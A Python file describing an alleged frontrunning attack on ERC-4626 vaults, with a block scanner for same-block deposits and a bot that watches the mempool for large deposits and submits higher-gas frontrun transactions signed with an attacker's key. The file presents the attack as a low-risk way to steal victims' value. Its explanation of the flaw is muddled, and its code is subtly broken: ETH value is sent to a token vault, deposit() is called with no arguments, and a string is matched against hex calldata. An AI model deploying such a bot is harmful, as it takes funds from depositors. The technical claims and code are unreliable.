# ====================================
# a) Vulnerability and Payoff (Description Only)
# ====================================

"""
Vulnerability:
In older versions of the ERC-4626 implementation by OpenZeppelin, the `deposit()` and `mint()`
functions used real-time values of `totalAssets()` and `totalSupply()` to calculate how many
shares a user should receive. These values were not locked or snapshotted before execution,
which opened up a frontrunning attack vector.

An attacker could:
1. Spot a large `deposit()` transaction in the mempool.
2. Submit a small deposit first to increase `totalAssets`.
3. The vault’s share price increases (assets per share), so the victim gets fewer shares for the same amount of ETH.
4. The attacker then redeems their shares after the victim’s deposit to extract more ETH than they put in.

Payoff:
- The attacker effectively steals a portion of the victim's value.
- This is a gas-efficient, low-risk MEV strategy.
- Can be executed programmatically via a bot.
"""

# ====================================
# b) Historical Detection Script
# ====================================

from web3 import Web3
from eth_account import Account

INFURA_KEY = 'YOUR_INFURA_KEY'
VAULT_ADDRESS = '0xYourVaultAddress'
ABI = [...]  # Replace with your ERC-4626 vault ABI
PRIVATE_KEY = '0xYourPrivateKey'


w3 = Web3(Web3.HTTPProvider(f'https://mainnet.infura.io/v3/{INFURA_KEY}'))
vault = w3.eth.contract(address=VAULT_ADDRESS, abi=ABI)

def detect_frontrun(start_block, end_block):
    print(f"Scanning blocks {start_block} to {end_block}")
    deposits = vault.events.Deposit.createFilter(fromBlock=start_block, toBlock=end_block).get_all_entries()

    for i in range(len(deposits) - 1):
        tx1, tx2 = deposits[i], deposits[i + 1]
        if tx1['blockNumber'] == tx2['blockNumber']:
            delta = abs(tx1['args']['assets'] - tx2['args']['assets'])
            if delta > 1e18:
                print(f"Potential frontrun at block {tx1['blockNumber']}:")
                print(f"  Attacker: {tx1['args']['caller']} -> {tx1['args']['assets']} wei")
                print(f"  Victim:   {tx2['args']['caller']} -> {tx2['args']['assets']} wei")

# Example call (won't run without real config):
# detect_frontrun(18000000, 18000100)

# ====================================
# c) Frontrun Bot Simulation (Conceptual)
# ====================================

def frontrun_bot():
    wss_w3 = Web3(Web3.WebsocketProvider(f"wss://mainnet.infura.io/ws/v3/{INFURA_KEY}"))
    vault_ws = wss_w3.eth.contract(address=VAULT_ADDRESS, abi=ABI)
    attacker = Account.from_key(PRIVATE_KEY)

    subscription = wss_w3.eth.filter('pending')
    print("Listening for big deposit txs...")

    for tx_hash in subscription.get_new_entries():
        tx = wss_w3.eth.getTransaction(tx_hash)
        if tx.to == VAULT_ADDRESS and 'deposit' in tx.input:
            if tx.value > Web3.toWei(50, 'ether'):
                print(f"Opportunity: {tx_hash.hex()}")

                # Build frontrun tx
                frontrun_tx = vault_ws.functions.deposit().buildTransaction({
                    'from': attacker.address,
                    'value': Web3.toWei(1, 'ether'),
                    'gas': 150000,
                    'gasPrice': tx.gasPrice + 2_000_000_000,
                    'nonce': wss_w3.eth.getTransactionCount(attacker.address)
                })

                signed = wss_w3.eth.account.sign_transaction(frontrun_tx, attacker.key)
                wss_w3.eth.sendRawTransaction(signed.rawTransaction)
